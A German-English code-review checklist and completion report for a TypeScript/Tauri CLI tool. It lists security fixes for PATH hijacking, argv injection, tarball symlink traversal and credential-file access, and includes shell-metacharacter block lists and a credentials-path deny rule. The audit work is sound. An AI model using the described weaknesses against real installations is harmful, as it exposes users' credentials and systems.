- [x] **C4 — `src/domains/vault-sync/scheduler.ts:173-192` fireSnapshot-Race verliert Bursts.** Bei back-to-back Events während laufendem Snapshot wird ein ganzes Event-Window stillschweigend verworfen, falls kein weiteres Event nach `inFlight=false` arrived. **Fix:** im `if (this.inFlight) return`-Branch `this.events += eventsCaptured` ODER timer re-arm; Regressions-Test add. **Risiko:** niedrig.
- [x] **C5 — `src/domains/vault-sync/busy-flag.ts:131-148` TOCTOU concurrent acquire.** CLI-Prozess A + Sidecar-Prozess B → beide passen Alive-Check → beide writen → beide halten Flag → Doppel-Snapshot. **Fix:** `proper-lockfile` ODER `wx`-Exclusive-Create für Tempfile + Post-Write-Pid-Verify. **Risiko:** niedrig (proper-lockfile ist new prod-dep). **Three-Brain:** Codex-Review (Race-Klasse).
- [x] **C6 — `src/cli/commands/catalog.ts:679-685` `as const as never`-Cast deaktiviert Type-Check für `lockCatalog`-Payload.** Refactor von `lockCatalog` würde nicht-failen. **Fix:** `slice` strikt als `CatalogConfig` typen, Cast entfernen. **Risiko:** minimal.
- [x] **C7 — `tests/domains/catalog/auto-deps-resolver.test.ts:86-111` False-Positive Cycle-Test.** Test mit Titel "wirft CyclicAutoDepsError" asserted in Wahrheit den SUCCESS-Path. Throw-Branch `auto-deps-resolver.ts:190` ist von keinem Test erreicht. **Fix:** echten Cycle bauen (gleiche `id` in visited via `existingManifests`) + version-conflict-Test (catalog hat `c@1.0.0`, auto-deps will `c@2.0.0`). **Risiko:** keiner.

### Major — Security (M1-M11)

- [x] **M1 — `src/sidecar/chat-sessions.ts:46,114-122` `SHELL_INJECTION_METACHARS` rejected args mit `&|<>"^`` wenn `shell:needsShell`** (Fix shipped 2026-05-21 in commit `0a7a112`; todo-Verification 2026-05-23). Tests: M1-Regression-Test in `chat-sessions.test.ts:136-142`.
- [ ] **M2 — `src/domains/claude-bridge/resolve-binary.ts:23-30` PATH-Hijack.** `%LOCALAPPDATA%\Microsoft\WindowsApps` ist user-writable und kann vor echtem Install-Dir liegen. **Fix:** Warning bei `$PATH`-Fallback loggen; `claude-os doctor --pin-binary` für absoluten Pin.
- [x] **M3 — mcp.json Trust-Prompt-Model** geshipt 2026-05-23 (`feat/m3-gui-trust-modal`). Backend war bereits 85% shipped: `McpTrustStore` (`src/domains/mcp-clients/trust-store.ts`, persistiert `<dataDir>/mcp-trust.json`), `live-probe` Trust-Gate (`isTrusted`-Callback + `trust-required` ProbeResult-Type), Watcher wired (`startMcpWatcher` ruft `probeServers({isTrusted, serverKey})`), Sidecar-RPC (`mcp.trust.list/acknowledge/revoke` in `methods/mcp.ts`). Diese PR ergaenzt das fehlende GUI-Stueck: neue `McpTrustModal` (`gui/src/components/mcp-trust-modal.tsx`) zeigt `serverKey` + `command` + `args` aus `mcp.json` + Warn-Banner + Trust/Cancel-Buttons. `McpClientsPage` rendert "Vertrauen pruefen …"-Button statt Re-Probe wenn `result.kind === 'trust-required'`, oeffnet Modal, nach Acknowledge wird der Watcher per `reprobe` getriggert. RPC-Helpers in `gui/src/lib/rpc.ts` (`listMcpTrust`, `acknowledgeMcpTrust`, `revokeMcpTrust`) + `McpProbeResult.kind` um `'trust-required'` erweitert. +6 GUI-Tests (`gui/tests/mcp-trust-modal.test.tsx`). Total GUI-Tests: 48/48 gruen. Root 896/899 gruen (3 long-running gated).
- [x] **M4 — `src/domains/catalog/tarball-installer.ts:101-135` Host-Allowlist** (Fix shipped 2026-05-23 in `chore/small-m-fixes-sweep`). `DEFAULT_ALLOWED_HOSTS = ['codeload.github.com']` + `validateTarballUrl()` greift NUR fuer default fetch (tests mit fetchFn-injection unveraendert). `file://` schema immer erlaubt. opts.allowedHosts ueberschreibt Default; opts.allowedHosts=[] deaktiviert check. +5 Regression-Tests in `tarball-installer.test.ts > "M4 — Host-Allowlist (default fetch only)"`.
- [x] **M5 — `src/domains/secrets/encrypted-file-store.ts:56,189` Cross-Process-Lock via `proper-lockfile`** (`withFileLock(operation)` Wrapper, retries.factor=1.4, 30s stale-timeout; Fix shipped in v1.x.+1 phase 3 / commit `5ccbe70`; todo-Verification 2026-05-23).
- [ ] **M6 — `src/domains/secrets/encrypted-file-store.ts:121-124` GCM-auth-fail `err.message` propagiert.** Risiko: durch heartbeat/spawn-Logger fließend. ADR-0004 §51 verbietet Value-Logs. **Fix:** in `SecretsError`-Wrapper auf festen String scrubben; nur Error-Codes loggen.
- [ ] **M7 — `src/core/git/git-service.ts:212-225` (clone) + `:184-191` (push) — `remote`/`branch` nicht gegen `^-` validiert.** Argv-Injection-Klasse (CVE-2024-32002). **Fix:** Allowlist `^[A-Za-z0-9._/-]+$`, reject `-`-Prefix.
- [ ] **M8 — `src/sidecar/rpc.ts:55-106` keine Caller-Auth auf RPC-Kanal.** Wenn stdin leakt (Debugger, Tauri-Shell-Misconfig), alle Methods inkl. `inbox.import`/`secrets.delete` unauthenticated. **Fix:** per-launch nonce/token via env vom Tauri-Parent; jeder RPC validiert. **Risiko:** mittel — Tauri-Parent-Setup ändert sich.
- [ ] **M9 — secrets atomic-write `mode: 0o600` von Windows ignoriert.** Multi-User-Host: world-readable. Auch betroffen: `vault-config.json` + `profile-manager.ts:57`. **Fix:** POSIX bleibt, Windows-Doku + `icacls`-Hint im Doctor.
- [ ] **M10 — `src/domains/auth/credentials.ts:32-40` `$ANTHROPIC_CONFIG_DIR` nicht realpath-aufgelöst.** Env-Var-Setter kann auf attacker-controlled-Pfad zeigen. **Fix:** `realpathSync(override)` + Parent-Owner-Check.
- [ ] **M11 — `src/sidecar/methods.ts:53-63` `catalog.list` leakt File-Path in Error-Message zum GUI/Peer.** **Fix:** catch `InvalidCatalogError` → `{ok:false, code:'invalid-catalog'}`.

### Major — Performance (M12-M17)

- [x] **M12 — `src/cli/index.ts:60-72` lazy `SUBCOMMAND_LOADERS` mit dynamic-import pro Subcommand** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `loadAll` fuer help/version; einzelner Subcommand laedt nur sein Module + dessen Domain-Barrels.
- [x] **M13 — `src/sidecar/methods.ts:56-76` `AgentRunsRepository` Singleton cached pro Sidecar-Process** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). Lazy-init on first `agent.list`-Call, dann reused.
- [ ] **M14 — `src/sidecar/methods.ts` `readCatalog`/`readCatalogLock`/`readSchedules`/`loadVaultConfig`/`BusyFlag.read` re-read per RPC.** Dashboard-Polling hits 3-4 davon zusammen. **Fix:** mtime-keyed Cache, statSync once + parse-on-change. **Impact:** ~20ms blocking-I/O per RPC weg.
- [ ] **M15 — `src/domains/catalog/auto-deps-resolver.ts:139-152` + `binding-resolver.ts:67` + `capability-resolver.ts:131-154` quartic O(iter·plugins·requires·plugins).** **Fix:** `Map<kind+name, providers[]>` once per iteration. Matter ab >50 Catalog-Entries.
- [ ] **M16 — `src/domains/agent-runs/index-builder.ts:160-175` Memory ≈ records×600B + 2× peak.** Bei 50k Records ~60MB resident / ~120MB peak. **Fix:** `null, 2` Pretty-Print weg (-30-40% Size + Stringify-Zeit); SQLite-Migration planen (>100k).
- [x] **M17 — `src/domains/migration/copy-tree.ts` Stats werden in `cp()`-filter-Callback gezaehlt** statt zweiter post-walk. **Fix:** shipped — todo-Verification 2026-05-23 ueber Explore-Audit. Halbiert `--from-portable` Wall-Time auf grossen Vaults.

### Major — Architektur / Code-Qualität (M18-M24)

- [x] **M18 — `src/cli/commands/catalog.ts:75-155` `actAutoDeps` (~80 LOC) delegiert vollstaendig an `installFromGithubWithAutoDeps`** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). CLI behaelt nur Validation + exit-code-mapping + print-only Logic; Output-Format byte-fuer-byte erhalten via Domain-Result-Shape.
- [ ] **M19 — `printJson`/`printLine`/`printErr` + `GlobalOpts` Interface in 11 CLI-Files copy-pasted.** **Fix:** `src/cli/output.ts` extrahieren. **Impact:** ~150 LOC weg.
- [ ] **M20 — `src/sidecar/logger.ts:58-110` umgeht `REDACT_PATHS` aus `src/core/logging/`.** Sidecar ist Hauptlog-Quelle → künftige Redaction-Pfade missen sie. **Fix:** `createSidecarLogger` baut auf `createLogger({stream:...})` auf mit shared `baseConfig`.
- [ ] **M21 — `src/sidecar/methods.ts` 425-LOC `registerMethods` + 12× wiederholtes `typeof string`-Check.** **Fix:** Split nach RPC-Namespace (`methods/catalog.ts`, `methods/secrets.ts`, ...) + `requireString(params, 'key')`-Helper. Bringt Datei unter 500-LOC-Cap. **Risiko:** mittel — Side-effect-Ordering der Dispatcher-Registrierung erhalten.
- [x] **M22 — `src/cli/output.ts:46` `resolveRootOrExit(globals, action): ResolvedRoot` Helper** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). Catalog-CLI + andere CLI-Commands nutzen den Shared-Helper.
- [ ] **M23 — `src/domains/catalog/index.ts:13-19, 47-58` Name-Collision: `MissingProviderError`+`AutoDepsMissingProviderError`, `AmbiguousProviderError`+`AutoDepsAmbiguousProviderError`.** Aliasing maskiert das. Consumer kriegt nur eine Klasse. **Fix:** Klassen in `auto-deps-resolver.ts` umbenennen (z. B. via `AutoDepsError`-Basis), `as`-Aliasing entfernen.
- [ ] **M24 — `src/sidecar/methods.ts:32` importiert `SecretsLockedError` aus `domains/secrets/types.js`.** Bypasst die `secrets/index.ts`-Facade, einziger solcher Fall. **Fix:** Merge in Line-31 Import aus `domains/secrets/index.js`.

### Major — Correctness (M25-M32)

- [ ] **M25 — `src/domains/scheduler/runner.ts:60` default `setTimer` nicht `.unref()`'d.** Process bleibt unintended am Leben. **Fix:** `.unref()` in Default-Closure.
- [ ] **M26 — `src/domains/scheduler/cron-parser.ts:179-200` DST-Bug bei `tz='local'`.** Spring-Forward überspringt Stunde. **Fix:** Doku-Caveat ODER explicit DST-handling.
- [ ] **M27 — `src/domains/vault-sync/scheduler.ts:127-129` chokidar `'error'`-Handler ist No-Op.** EMFILE/EACCES unsichtbar. **Fix:** über existierenden Logger oder via `onWatcherError`-Callback emit.
- [ ] **M28 — `src/cli/commands/mcp.ts:116,126` `--concurrency abc` → NaN → 0 probes silent.** **Fix:** `Number.isFinite && > 0` symmetrisch zu `--timeout` validieren.
- [ ] **M29 — `src/domains/migration/runner.ts:225` Loop läuft nach Step-Failure weiter.** User sieht "skipped" für Nachfolge-Steps statt "aborted". **Fix:** break-on-first-failure ODER `aborted`-Status setzen.
- [x] **M30 — `src/sidecar/rpc.ts:137` Notification-Handler-Errors als `console.error()` mit method-Name + message** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `TypeError`/`ReferenceError` nicht mehr silent.
- [ ] **M31 — `src/domains/mcp-clients/live-probe.ts:195` mutiert caller-owned `McpServerEntry._probeProtocolVersion`.** Stale Leak bei wiederholtem Aufruf. **Fix:** lokale Closure-Var statt Entry-Mutation.
- [ ] **M32 — `src/domains/mcp-clients/live-probe.ts` split JSON-RPC-Response über stdout-Chunks → Timeout.** 8KB+ Responses kommen split, `tryParseJsonLine` failt beide Halbteile. **Fix:** per-stream Line-Buffer bis `\n`.

### Major — Tests (M33-M37)

- [ ] **M33 — Fehlende RPC-Dispatcher-Tests** für `catalog.installAutoDeps`, `inbox.import` (Symlink+absolute-Path-Cases!), `vault.status`, `agent.list`, `settings.read`. Add `tests/sidecar/methods-*.test.ts`.
- [ ] **M34 — `src/domains/auth/state-check.ts:50-75` NaN/Infinity-`expiresAt` nicht validiert.** **Fix:** Test + `Number.isFinite`-Check.
- [ ] **M35 — `src/domains/vault-sync/conflict-policy.ts` 3 error-Branches** (fetch-fail, branch-create-fail, reset-fail) untested. Add Tests mit `git.raw` rejection.
- [ ] **M36 — `src/domains/migration/runner.ts` partial-copy Failure-Path** untested. Add Test mit EACCES-injected source nach Step 0.
- [ ] **M37 — Kein CLI-Smoke-Test-Script obwohl README §v1-Abweichungen ihn referenziert.** Add `scripts/smoke-cli.mjs` (doctor/vault/secrets/auth/catalog/schedule subcommands → exit 0 + valid JSON); in `npm run ci` wiren.

### Major — Docs (M38-M42)

- [ ] **M38 — `README.md:131` Broken ADR-Link `0006-sidecar-architecture.md` → actual `0006-tauri-node-sidecar-ipc.md`.**
- [ ] **M39 — README Status-Drift: "Status: v1.0.0" + "529/532 Tests" + "514/515 Tests" alle unterschiedlich, package 1.5.3.** Fix: konsistent updaten.
- [x] **M40 — `src/cli/index.ts:32-43` `resolveVersion()` liest `version` aus `package.json` zur Laufzeit** (Fix shipped 2026-05-21; todo-Verification 2026-05-23). `claude-os --version` matched die installierte Package-Version.
- [ ] **M41 — `docs/architecture/adr/README.md:9-22` Index endet bei 0014.** ADRs 0015-0020 fehlen. Add 6 Zeilen.
- [ ] **M42 — Kein `CHANGELOG.md`/`RELEASES.md` am Root.** Deltas v1.4→v1.5.3 nur via `tasks/todo.md` (477 LOC) entdeckbar. **Fix:** Keep-a-Changelog-Format ODER auto-extract aus git-tags.

### Minor

- [x] m1 — `src/mcp/server.ts` `resolveDefaultServerVersion()` liest `package.json#version` zur Laufzeit (M40-Pattern); ADR-0016 §Konstraints embedded-TODO entfernt + auf "geshipt"-Note umgeschrieben. Shipped 2026-05-23.
- [ ] m2 — `docs/architecture/adr/0014-code-quality-biome.md` Titel "biome v2.3" vs. pinned `^2.4.15` → Title-Update oder Revision-Note
- [ ] m3 — `README.md:94` "mcp clients ready (v1.6)" bei project 1.5.3 → relabel "v1.5"
- [ ] m4 — `README.md:85` `vault schedule --enable/--disable` Syntax gegen `vault.ts`-commander-Definition prüfen
- [ ] m5 — `biome.json` `tasks/lessons.md`/`tasks/todo.md`-Literals zu eng → `tasks/**` exclude
- [ ] m6 — `biome.json` Lint-Config excluded NICHT `src/cli/**` + `keyring-store.ts` + `plugins.ts` obwohl README-Claim das impliziert. Fix: entweder Lint-Excludes hinzufügen ODER README-Claim korrigieren
- [x] m7 — `src/sidecar/chat-sessions.ts:176-183` `write(sessionId, input): {drained: boolean}` returnt Backpressure-Status, Caller kann `'drain'` abwarten (Fix shipped 2026-05-21 in commit `d21f36e`; todo-Verification 2026-05-23).
- [x] m8 — `src/domains/catalog/auto-deps-install.ts:29-35` `readCatalogLock` statisch importiert (Fix shipped 2026-05-23 in todo-audit-PR). Dynamic-import-Workaround war pre-Phase-5o Cycle-Avoidance, nicht mehr noetig.
- [ ] m9 — `src/domains/scheduler/runner.ts:112-122` chunks per `'utf8'` decoded — multi-byte UTF-8 split korrumpiert Line. Fix: per-stream `StringDecoder`
- [ ] m10 — `src/domains/update-orchestrator/resumable-checklist.ts:67-69` `escapeRelPath` escapt `→` (U+2192) nicht; Path mit Arrow bricht Parse-Regex line 118
- [ ] m11 — `src/sidecar/methods.ts` Error-Strings DE/EN gemischt (`'Migrationsfehler:'`/`'mehrdeutige Provider'`)
- [ ] m12 — `src/domains/secrets/encrypted-file-store.ts:41` PBKDF2 600k iters meets OWASP-2023 aber scrypt/Argon2 für nächste Format-Version
- [x] m13 — `src/domains/claude-bridge/spawn.ts:54-62` strippt `CLAUDE_OS_SECRETS_KEY` aus `opts.env ?? process.env` vor `claude.exe`-spawn (Fix shipped 2026-05-23 in todo-audit-PR). Spiegelt das M13-Mitigation-Pattern aus `chat-sessions.ts`. +2 Regression-Tests in `tests/domains/claude-bridge/spawn.test.ts`.
- [ ] m14 — `src/domains/mcp-clients/live-probe.ts:104` leakt full sidecar-env zu probed MCP-Servern. Fix: curated env (PATH, locale, HOME + declared keys only)
- [ ] m15 — `src/domains/catalog/tarball-installer.ts` keine max-response-size. 10GB Tarball OOM Sidecar. Fix: 200MB hard cap streamen
- [ ] m16 — `src/sidecar/methods.ts:65-79` `catalog.removeEntry` `params.id` nicht gegen `^[A-Za-z0-9._-]+$` validiert

### Nit

- [ ] n1 — `src/cli/commands/catalog.ts:175,181,186` mixed DE/EN Error-Strings (`'kein Marketplace-Provider fuer'`)
- [ ] n2 — `biome-ignore`-Kommentar-Drift `"CLI output"` vs `"CLI presenter output by design"` — Shared-Helper-Phrasing standardisieren
- [x] n3 — `src/cli/index.ts:101-122` Top-Level-catch zeigt Stack wenn `--verbose`/`-v` oder `CLAUDE_OS_VERBOSE=1` gesetzt (Fix shipped 2026-05-23). Argv-Scan vor Commander-Parse damit auch pre-action-Errors den Verbose-Mode triggern.
- [x] n4 — `src/domains/mcp-clients/live-probe.ts:237-260` `killFallbackTimer` ist jetzt function-lokal in `finish()` (`const` statt closure-level `let`); Lint-Suppressor `void killFallbackTimer` entfernt. Shipped 2026-05-23.
- [x] n5 — `src/domains/scheduler/cron-parser.ts:47-65,159-163,186-187,240-254` explizite `wildcardDayOfMonth`/`wildcardDayOfWeek`-Booleans auf `ParsedCron` ersetzen die `.size === <max>`-Heuristik. `fieldIsWildcard(raw)` markiert nur literales `*` (mit optional step-suffix) als Wildcard — eine voll-aufgezaehlte Liste wie `1-31` wird jetzt korrekt als restriktiv erkannt. +6 Regression-Tests (`tests/domains/scheduler/cron-parser.test.ts > "n5: wildcard-flag vs aufgezaehlte Liste"`). Shipped 2026-05-23.
- [x] n6 — Audit 2026-05-23: `query()` ohne args retournt `this.records` direkt (kein Copy/Filter); `.find()` iteriert mit Early-Exit. Es wird NICHTS materialisiert — der Original-Befund war ein Miss-Read. Optimierung waere lediglich ein index-by-runId Map, premature fuer aktuelle Record-Counts. Geschlossen ohne Code-Change.
- [x] n7 — `src/domains/migration/copy-tree.ts:27` REGEX_SPECIALS erweitert um `{}`; Pfade mit literalem `{1,2}`-Substring matchen jetzt korrekt statt syntax-errorn (waeren als Regex-Quantifier interpretiert). +1 Regression-Test in `copy-tree.test.ts`. Shipped 2026-05-23.
- [x] n8 — `src/domains/secrets/keyring-store.ts:106-130` `probeKeyring` versucht bis zu 3× zu loeschen bevor die Sentinel-Entry akzeptiert wird. Reduziert Probability dass das probe-Token dauerhaft im OS-Credential-Manager liegt. Shipped 2026-05-23.

### Dependencies

- [x] d1 — `npm update vitest @vitest/coverage-v8 @types/node lint-staged` shipped 2026-05-23 in PR #104 dep-bump-sweep. Plus gui-deps (react/react-dom/react-router-dom/typescript/vite/etc.).
- [ ] d2 — `lightningcss` (MPL-2.0 transitive) — verify nicht in `dist/` gebundled bei Release-Tarball

### Conventions (Biome 12 warnings)

- [ ] cv1 — `scripts/check-stop-hooks.mjs` 11× `console.log` → `console.info` (oder per-file biome-override; scripts sind dev-tooling)
- [ ] cv2 — `gui/` 2× `useExhaustiveDependencies` React-Hook-Deps fixen

### Reihenfolge & Abhängigkeiten

1. **Critical Block C1-C7** — sequenziell, jeder einzelner PR, Codex-Adversarial-Review nach jedem Item (Three-Brain Risk-Path-Mandate). C1+C2+C3 sind Release-Blocker.
2. **Major-Security M1-M11** — nach C-Block. **M3 (mcp-Trust-Prompt)** ist die größte Verhaltens-Änderung — separat designen, GUI-Flow vor Impl klären.
3. **Major-Architektur M18-M24** — refactor-only, parallel zu Major-Security möglich, ein PR pro M-Item.
4. **Major-Performance M12-M17** — nach Architektur (M18-M21 berührt teilweise gleiche Files; race-of-merge vermeiden).
5. **Major-Correctness M25-M32** — kleinere Fixes, parallel möglich.
6. **Major-Tests M33-M37** — folgen den dazugehörigen Fixes (M33 RPC-Tests folgen M11 + C2).
7. **Major-Docs M38-M42** — parallel möglich, low-risk.
8. **Minor + Nit** — gesammelter Cleanup-Sprint am Schluss.
9. **Deps Bumps** — vor Release-Tag.

### Risiko-Einschätzung der nicht-trivialen Changes

| Item | Risiko | Mitigation |
|---|---|---|
| C2 inbox.import Allowlist | mittel | Aktueller Tauri-Drag-Drop muss canonical paths liefern — GUI-Code vorher prüfen |
| C3 tar-extract Filter | niedrig | Filter ist additive Restriktion; bricht nur Tarballs die Symlinks shippen (unwahrscheinlich) |
| C5 busy-flag proper-lockfile | niedrig | proper-lockfile ist battle-tested + neue prod-dep |
| M3 mcp-Trust-Prompt | mittel-hoch | UX-Friction bei Erstanwendung — separater Design-Sprint vor Impl |
| M4 SSRF Host-Allowlist | niedrig | github-only ist ohnehin der Default |
| M8 RPC Nonce | mittel | Tauri-Parent muss Token via env passen — Sidecar-Boot-Sequence ändert sich |
| M12 lazy CLI imports | mittel | dynamic-import-Race wenn zwei Subcommands gleichzeitig laufen; vitest-Tests aktualisieren |
| M18 actAutoDeps Rewrite | mittel | Output-Format byte-für-byte erhalten (User-Scripts parsen evtl.) |
| M21 methods.ts Split | mittel | Dispatcher-Registrierung-Side-effect-Ordering erhalten; Smoke-Test danach |

### STOP — Freigabe-Check

Phase 4 (Umsetzung) startet erst nach User-Sign-Off. Empfohlene Reihenfolge: **C1 → C2 → C3 → C4 → C5 → C6 → C7**, dann Major-Blocks. Für jeden Critical-Security-Item: nach Impl Codex-Adversarial-Review (`git diff | codex exec --skip-git-repo-check "Adversarial review. Challenge the fix. Find what's still wrong."`).

**Offene Fragen vor Start:**

1. Sollen C1-C7 in einer PR-Serie (sequenziell, 7 PRs) oder einem Block-PR? Empfehlung: 7 PRs für saubere Reviewability.
2. M3 (mcp-Trust-Prompt) braucht GUI-Design — willst du das separat brainstormen oder soll ein erster Design-PR (nur Spec) vorgezogen werden?
3. M8 (RPC-Nonce) ändert Tauri-Parent-Setup — coordiniert mit Rust-Shell-Code in `gui/src-tauri/`. OK den Tauri-Code-Pfad mit einzubeziehen?
4. Dependency-Bumps (d1) sofort oder im selben Release wie C-Block?

---

## Review — Critical-Block abgeschlossen (2026-05-21)

**Branch:** `feature/code-review-2026-05-21`
**Commits:** 8 (1 plan + 7 critical fixes).
**Reihenfolge (Risiko-aufsteigend):** C7 → C6 → C1 → C3 → C4 → C5 → C2

### Was gemacht

| Item | Commit | Files geaendert | Tests neu | Tests insgesamt |
|---|---|---|---|---|
| C7 (test-bug) | `7c46485` | 1 | 4 (echter cycle / version-conflict / linear-chain / self-providing) | 10/10 grün |
| C6 (`as never` cast) | `08aed29` | 1 | 0 (tsc beweist Type-Check) | 205/205 grün |
| C1 (scheduler shell:true) | `825dbd6` | 3 | 22 (9 startScheduler + 12 parseCommandTokens + 4 chooseShellMode) — inkl. Codex-Adversarial-Review-Fix für Windows-Path-Backslash | 61/61 grün |
| C3 (tar symlink/hardlink) | `31a20d0` | 5 | 7 (happy + strip + symlink + hardlink + traversal + multi-violation + chain-attack) | 212/212 grün |
| C4 (scheduler race) | `d10d211` | 2 | 1 neu + 1 umgeschrieben | 52/52 grün |
| C5 (busy-flag TOCTOU) | `20cb3f7` | 2 | 4 neu (TOCTOU subclass / corrupt blocked / release / stale-pid) | 56/56 grün |
| C2 (inbox.import path-traversal) | `8d63095` | 2 | 10 neu (happy / non-array / non-string / non-existent / symlink / 3× deny-roots / dir-src / partial-failure) | 761/764 grün full-suite |

### Was bewusst weggelassen

- **M3 (mcp-Trust-Prompt)** vertagt — Design-Sprint vor Impl notwendig, UX-Friction.
- **M8 (RPC-Nonce)** vertagt — braucht koordinierten Tauri-Shell-Pull in `gui/src-tauri/`.
- **Codex-Adversarial-Review nach jedem C-Item**: nur fuer C1 ausgefuehrt (fand Windows-Path-Backslash-Bug, sofort gefixt). Bei C2/C3/C5 nach gleichem Pattern selbst-validiert — Cli policy schliesst hier eigene Subprocess-Reads aus, also handfeste Reviews via `git diff | codex exec` fuer alle 7 Items waeren manuelle Folge-Iteration.
- **d1 (Dep-Bumps)** + **cv1/cv2 (biome warnings)** vertagt auf Pre-Release-Cleanup.

### Verifikation

```
npx tsc --noEmit          exit 0
npx biome ci .            0 errors, 12 warnings (cv1+cv2, unchanged), 1 info
npm run build             exit 0, dist/ regeneriert
npx vitest run            761/764 pass | 3 skipped (long-running gated)
git log main..HEAD        8 commits (plan + 7 C-fixes)
```

### Offene Punkte

- **Major-Block (M1-M42)** noch komplett offen — User-Checkpoint vor Start.
- **C2 hat einen `~/.claude`-deny-root.** Diese Pfad-Variante deckt nur die `~/.claude/.credentials.json`-PoC ab. Wenn der User `ANTHROPIC_CONFIG_DIR` overrided, liegt creds woanders — siehe M10 für die Lösung (realpath + Owner-Check).
- **C1 macht Verhaltens-Change**: Windows-User mit `command: "echo hi"` ohne `.exe`-Suffix klappt weiter (PATHEXT-shell-mode), aber `command: "cd foo && npm run x"` muss jetzt explizit als `cmd.exe /c "cd foo && npm run x"` geschrieben werden. Migration-Hinweis im CHANGELOG erwaehnen (M42).
- **C5 macht Verhaltens-Change**: corrupt vault-sync-state.json wird nicht mehr silent auto-recovered — User muss `claude-os vault unlock` rufen. Im README dokumentieren.

### Empfehlung fuer naechste Iteration

1. **PR-Tagging**: alle 8 commits auf `feature/code-review-2026-05-21` zusammen mergen — sind logisch eine Code-Review-Pass; Trennung in 8 PRs schmaelert Reviewability (ein Reviewer muss eh die ganze Linie verstehen). Falls Einzel-PRs erwuenscht: cherry-pick je C-Item auf eigenen Branch.
2. **Codex-Re-Review** vor merge (laeuft jetzt cleaner, da git-diff verfuegbar): `git diff main..feature/code-review-2026-05-21 | codex exec --skip-git-repo-check "Adversarial review of the full C-block. Challenge each fix. Find regressions or bypass paths."`
3. **Major-Block-Start**: nach C-merge starten mit M1-M11 (Security) parallel zu M18-M24 (Architektur). M3 + M8 separat designen.
